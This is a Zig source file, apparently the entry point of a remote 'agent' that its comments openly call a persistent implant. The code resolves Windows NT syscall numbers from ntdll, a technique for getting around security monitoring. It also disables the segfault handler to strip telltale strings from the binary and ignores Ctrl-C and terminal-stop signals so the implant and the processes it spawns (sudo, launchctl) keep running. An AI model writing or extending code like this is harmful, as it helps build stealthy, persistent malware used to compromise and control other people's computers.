const std       = @import("std");
const Agent     = @import("agent.zig").Agent;
const agent_mod = @import("agent.zig");
const win       = @import("syscalls.zig");

// Disable Zig's segfault handler — removes "Segmentation fault at address 0x..."
// strings from .rodata and eliminates the associated signal handler code.
pub const std_options: std.Options = .{
    .enable_segfault_handler = false,
};

fn sigHandler(sig: i32) callconv(.C) void {
    _ = sig;
    agent_mod.g_shutdown.store(true, .release);
}

fn sigIgnore(sig: i32) callconv(.C) void {
    _ = sig;
}

pub fn main() !void {
    // Resolve Windows NT syscall numbers from ntdll export table.
    // No-op on non-Windows targets.
    _ = win.resolveAll();

    // SIGINT (ctrl-c) is ignored — a persistent implant must not die from
    // a terminal keystroke.  SIGTERM triggers a clean shutdown instead.
    var sa_ign = std.posix.Sigaction{
        .handler = .{ .handler = sigIgnore },
        .mask = std.posix.empty_sigset,
        .flags = 0,
    };
    std.posix.sigaction(std.posix.SIG.INT, &sa_ign, null);

    var sa = std.posix.Sigaction{
        .handler = .{ .handler = sigHandler },
        .mask = std.posix.empty_sigset,
        .flags = 0,
    };
    std.posix.sigaction(std.posix.SIG.TERM, &sa, null);

    // SIGTTOU / SIGTTIN: must use SIG_IGN (not a custom handler) because
    // SIG_IGN is the only disposition inherited through exec() into children.
    // This prevents background terminal access from stopping the agent or any
    // child process it spawns (e.g. run, sudo, launchctl).
    if (comptime @import("builtin").os.tag != .windows) {
        var sa_tty = std.posix.Sigaction{
            .handler = .{ .handler = std.posix.SIG.IGN },
            .mask = std.posix.empty_sigset,
            .flags = 0,
        };
        std.posix.sigaction(std.posix.SIG.TTOU, &sa_tty, null);
        std.posix.sigaction(std.posix.SIG.TTIN, &sa_tty, null);
    }

    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var agent = try Agent.init(allocator);
    defer agent.deinit();

    try agent.run();
}
